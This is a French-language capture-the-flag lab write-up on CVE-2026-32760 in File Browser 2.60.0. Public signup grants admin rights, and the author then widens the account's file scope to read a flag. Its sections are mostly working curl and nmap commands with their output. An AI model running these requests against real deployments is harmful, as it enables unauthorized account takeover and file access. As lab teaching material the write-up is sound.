---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab File Browser : inscription publique vulnérable (CVE-2026-32760)"
date: 2026-10-20
categories: [Pentest, Exploitation]
tags: [cve-2026-32760, filebrowser, broken-access-control, enumeration, golang, api, secdojo, ctf]
---

# Lab File Browser : contrôle d'accès défectueux via inscription publique (CVE-2026-32760)

> **Lab :** [explorateur de fichiers — CyberLab #259](https://cyberlab.sec-dojo.com/lab/259)
> **Sujets :** CVE, Contrôle d'accès défectueux, Énumération
> **Cible :** `176.16.163.82`
> **Service web :** `http://176.16.163.82:8080`
> **Résultat :** ✅ élévation de privilèges au niveau applicatif, flag récupéré

## Objectif du lab

Ce scénario décrit un hôte Linux exécutant une application web de gestion de fichiers auto-hébergée. L'objectif est d'accéder au service, d'y élever ses privilèges et de récupérer le flag du système de fichiers sous-jacent.

## Résumé du chemin d'exploitation

Le scan a révélé SSH sur le port 22 et File Browser sur le port 8080. L'application était en version **2.60.0** et l'inscription publique était activée. L'inscription a créé un compte File Browser avec `admin: true`, conformément à la condition vulnérable de **CVE-2026-32760** : l'inscription publique hérite des permissions par défaut si celles-ci accordent les droits administrateur. Le compte avait toutefois un scope limité à `/srv`. Le scope a ensuite été changé en `.` avec l'API d'administration, ce qui a rendu visible la racine configurée par File Browser. Le fichier `/home/local.txt` contenait le flag.

> ⚠️ **Point important :** l'élévation obtenue était au niveau de **l'application File Browser**, pas un shell `root` Linux. La requête vers `/root/` a d'ailleurs répondu `403 Forbidden`.

## 1. Découverte des services

### Scan complet des ports TCP

```bash
TARGET=176.16.163.82
sudo nmap -Pn -n -p- --open -T3 -oN /tmp/ports.txt "$TARGET"
cat /tmp/ports.txt
```

Sortie pertinente :

```text
Nmap scan report for 176.16.163.82
Host is up (0.00023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

**Explication :**

- `-Pn` demande à Nmap de ne pas dépendre du ping pour considérer l'hôte actif
- `-n` désactive la résolution DNS inverse
- `-p-` examine les ports TCP de 1 à 65535
- `--open` n'affiche que les ports ouverts
- `-T3` choisit une vitesse de scan modérée
- `-oN /tmp/ports.txt` enregistre le résultat en texte normal

> ℹ️ Une première tentative d'extraire les ports avec `awk` a produit une liste vide et Nmap a répondu `Error #485: Your port specifications are illegal`. La méthode simple utilisée ensuite a été de passer directement `-p 22,8080`.

### Identification des versions et de l'application

```bash
sudo nmap -Pn -n -sC -sV -p 22,8080 -oN /tmp/services.txt "$TARGET"
cat /tmp/services.txt
```

Sortie pertinente :

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.14 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Golang net/http server
|_http-title:       File Browser
```

**Explication :** `-sV` tente d'identifier les versions des services ; `-sC` lance les scripts Nmap par défaut. Le titre HTTP a identifié l'application comme **File Browser**.

### Confirmation du service web et de la version

```bash
curl -sS -iL "http://$TARGET:8080/" | head -60
whatweb "http://$TARGET:8080/"
```

Sortie exacte de `whatweb` :

```text
http://176.16.163.82:8080/ [200 OK] Country[SAUDI ARABIA][SA], HTML5, IP[176.16.163.82], Script[module], Title[File Browser][Title element contains newline(s)!], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

> ℹ️ Cette sortie confirme que l'URL répond en `200 OK`, indique l'adresse IP et le pays géolocalisé par l'outil, détecte une page HTML5 avec un script de type module, et identifie le titre `File Browser`. `X-UA-Compatible` et `X-XSS-Protection` sont des en-têtes HTTP observés ; leur présence ne prouve pas à elle seule que l'application est sécurisée.

Le code HTML retournait notamment la configuration JavaScript suivante :

```javascript
window.FileBrowser = {"AuthMethod":"json", ... "LoginPage":true, "Signup":true, ... "Version":"2.60.0"};
```

Cela établissait deux éléments importants : la version détectée était **2.60.0** et l'inscription publique (`Signup`) était activée.

> 💡 L'essai Gobuster n'a pas produit de chemins fiables : le serveur renvoyait `200` même pour une URL aléatoire inexistante, avec une longueur de réponse de 5647 octets. Gobuster a donc signalé une réponse générique (« wildcard response ») et s'est arrêté. Il s'agissait d'un faux positif, pas d'un répertoire découvert.

> ⚠️ `PORT` dans une commande d'exemple est un placeholder. L'URL correcte dans ce lab devait contenir `:8080` ; une commande avec `:PORT` littéral échoue parce que `PORT` n'est pas un numéro.

## 2. Inscription publique et élévation dans File Browser

L'avis officiel **CVE-2026-32760** indique que les versions antérieures à 2.62.0 peuvent créer un compte administrateur lors d'une inscription publique si `signup=true` et si les permissions par défaut incluent `perm.admin=true`. La version observée, 2.60.0, est antérieure au correctif.

### Création d'un compte

```bash
BASE='http://176.16.163.82:8080'
U="hitotsu_$(date +%s)"
P='VOTRE_MOT_DE_PASSE_DE_LAB'

curl -sS -i -X POST "$BASE/api/signup" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"$U\",\"password\":\"$P\"}"
```

Le handler officiel de File Browser v2.60.0 utilise `/api/signup` et accepte un corps JSON avec `username` et `password`. Dans les résultats ultérieurs, le compte créé apparaissait comme `hitotsu_1792492328` ; cela confirme que l'inscription a abouti. Le mot de passe doit respecter la longueur minimale configurée par le serveur, qui s'est révélée être **12 caractères**.

### Connexion et contrôle du rôle

```bash
TOKEN=$(curl -sS -X POST "$BASE/api/login" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"$U\",\"password\":\"$P\"}")

curl -sS -o /tmp/users.json -w 'HTTP %{http_code}\n' \
  "$BASE/api/users" -H "X-Auth: $TOKEN"
python3 -m json.tool /tmp/users.json
```

`/api/login` renvoie un jeton d'authentification ; `TOKEN=$(...)` le conserve dans une variable shell. L'en-tête `X-Auth` transmet ce jeton aux requêtes API protégées.

> ⚠️ Le jeton ne doit pas être publié.

Sortie observée : `HTTP 200`, et les informations du compte comprenaient :

```json
{
  "id": 2,
  "username": "hitotsu_1792492328",
  "scope": "/srv",
  "perm": {
    "admin": true,
    "execute": false,
    "create": true,
    "rename": false,
    "modify": false,
    "delete": false,
    "share": false,
    "download": true
  }
}
```

Le rôle admin était donc confirmé. `HTTP 200` sur `/api/users` est également un indice que l'accès à cette route réservée aux administrateurs a été accordé.

### Vérification des réglages

```bash
curl -sS -o /tmp/settings.json -w 'HTTP %{http_code}\n' \
  "$BASE/api/settings" -H "X-Auth: $TOKEN"
python3 -m json.tool /tmp/settings.json
```

Sortie pertinente :

```json
{
  "signup": true,
  "createUserDir": false,
  "minimumPasswordLength": 12,
  "userHomeBasePath": "/users",
  "defaults": {
    "scope": "/srv",
    "perm": {
      "admin": true,
      "execute": false,
      "create": true,
      "rename": false,
      "modify": false,
      "delete": false,
      "share": false,
      "download": true
    },
    "hideDotfiles": false
  },
  "authMethod": "json"
}
```

Ces paramètres confirmaient les conditions de la vulnérabilité : `signup` était activé et les permissions par défaut accordaient `admin: true`. L'avis NVD décrit la même condition et précise que le correctif est en version 2.62.0.

## 3. Énumération initiale de l'espace de fichiers

```bash
curl -sS "$BASE/api/resources/" \
  -H "X-Auth: $TOKEN" | python3 -m json.tool
```

Sortie pertinente :

```json
{
  "items": [
    {
      "path": "/srv",
      "name": "srv",
      "isDir": true,
      "isSymlink": false
    }
  ],
  "path": "/",
  "isDir": true
}
```

L'API `GET /api/resources/{path}` sert à lister les fichiers et dossiers. Le dossier `/srv` a d'abord été listé :

```bash
curl -sS "$BASE/api/resources/srv/" \
  -H "X-Auth: $TOKEN" | python3 -m json.tool
```

Il renvoyait `"items": []`, donc le scope du compte, `/srv`, était vide.

## 4. Élargissement du scope dans File Browser

Le compte avait les droits admin, mais son scope était `/srv`. Le `PUT /api/users/2` a changé son scope en `.`. Dans File Browser, `.` correspond ici à la racine configurée pour l'application. La requête a nécessité le mot de passe actuel, transmis dans `current_password`.

```bash
curl -sS -i -X PUT "$BASE/api/users/2" \
  -H "X-Auth: $TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{\"what\":\"user\",\"which\":[\"scope\"],\"current_password\":\"$P\",\"data\":{\"id\":2,\"scope\":\".\"}}"
```

Sortie observée :

```text
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
...
200 OK
```

> ℹ️ Le token a ensuite été renouvelé en se reconnectant. Une tentative sur `/api/resources/root/` a affiché `403 Forbidden` ; comme la réponse était du texte et non du JSON, `python3 -m json.tool` a signalé `Extra data`. Cela ne signifiait pas que le parseur JSON était cassé : le serveur avait simplement renvoyé une erreur texte.

### Énumération des chemins après changement

```bash
for p in / /root/ /etc/ /home/ /tmp/ /var/ /opt/ /srv/; do
  echo "=== $p ==="
  curl -sS -w '\nHTTP %{http_code}\n' \
    "$BASE/api/resources$p" -H "X-Auth: $TOKEN" | head -c 1000
  echo
done
```

| Chemin | Résultat |
| --- | --- |
| `/` | `200` — racine contenant notamment `/bin`, `/config`, `/database`, `/defaults`, `/dev`, `/etc`, `/home` |
| `/root/` | `403 Forbidden` |
| `/etc/` | `200` — avec des éléments comme `/etc/group` |
| `/home/` | `200` — avec `/home/user` et `/home/local.txt` |
| `/tmp/` | `200` — dossier vide |
| `/var/` | `200` — avec `/var/spool` et `/var/www` |
| `/opt/` | `404 Not Found` |
| `/srv/` | `200` — un autre dossier `srv` vide |

> ℹ️ L'option `head -c 1000` limite chaque affichage à 1000 octets, donc certaines listes étaient tronquées. Le `403` sur `/root/` confirme que les droits d'application ne donnaient pas un accès universel au compte système root.

## 5. Récupération du flag

Le répertoire `/home` contenait le fichier `local.txt`.

```bash
curl -sS "$BASE/api/raw/home/local.txt" \
  -H "X-Auth: $TOKEN"
```

Sortie exacte :

```text
flag_0c9143a7_5be7_45d7_b597_ec633933546b
```

> ℹ️ La liste `/home/user/` était vide et n'a pas été nécessaire pour la récupération du flag.

## Explication des commandes API

| Élément | Rôle |
| --- | --- |
| `curl -X POST` | Envoie une requête HTTP POST, ici pour l'inscription ou la connexion |
| `-H 'Content-Type: application/json'` | Indique que le corps de requête est du JSON |
| `-d '{...}'` | Transmet les champs JSON au serveur |
| `-i` | Affiche aussi les en-têtes HTTP ; utile pour observer le statut et le type de réponse |
| `-sS` | Supprime la barre de progression tout en conservant les erreurs de transport |
| `-o fichier -w 'HTTP %{http_code}'` | Enregistre le corps dans un fichier et affiche seulement le code HTTP |
| `X-Auth: $TOKEN` | Authentifie les appels API après la connexion |
| `/api/users` et `/api/settings` | Ont servi à vérifier le privilège admin et la configuration de l'inscription |
| `/api/resources/chemin/` | Liste un dossier ; `/api/raw/chemin/fichier` renvoie le contenu d'un fichier |
| `python3 -m json.tool` | Met en forme une réponse JSON pour la rendre lisible ; échoue normalement si l'API renvoie un message texte ou une page HTML d'erreur |

## Conclusion

La chaîne était :

```text
Énumération réseau
   │
   ▼
Identification de File Browser 2.60.0
   │
   ▼
Inscription publique vulnérable (CVE-2026-32760)
   │
   ▼
Compte admin File Browser
   │
   ▼
Changement de scope vers "."
   │
   ▼
Lecture de /home/local.txt
```

Le flag a été récupéré **sans obtenir de shell Linux ni de privilège root système** — l'élévation de privilèges s'est produite entièrement au niveau de l'application web.

## Leçons retenues

- Une vulnérabilité de type **contrôle d'accès défectueux** ne nécessite pas toujours un exploit sophistiqué : ici, une simple inscription publique suffisait à obtenir un compte admin, à cause d'une mauvaise configuration des permissions par défaut.
- Le scope applicatif (`/srv`) peut masquer l'étendue réelle d'un accès admin obtenu — il faut penser à tester une élévation du scope lui-même une fois les droits admin confirmés, pas seulement s'arrêter à `perm.admin: true`.
- Un `403 Forbidden` sur une ressource sensible (`/root/`) est une preuve utile des limites de l'élévation : documenter explicitement ce qui n'a **pas** été compromis est aussi important que ce qui l'a été.
- Une réponse HTTP générique à `200` pour des URLs aléatoires (faux positif Gobuster) rappelle qu'il faut toujours valider le contenu réel d'une réponse plutôt que de se fier uniquement au code de statut HTTP.

## Références

1. [GitHub Advisory GHSA-5gg9-5g7w-hm73](https://github.com/advisories/GHSA-5gg9-5g7w-hm73)
2. [NVD — CVE-2026-32760](https://nvd.nist.gov/vuln/detail/CVE-2026-32760)
3. [File Browser v2.60.0 — auth.go](https://raw.githubusercontent.com/filebrowser/filebrowser/v2.60.0/http/auth.go)
4. [File Browser v2.60.0 — http.go](https://raw.githubusercontent.com/filebrowser/filebrowser/v2.60.0/http/http.go)
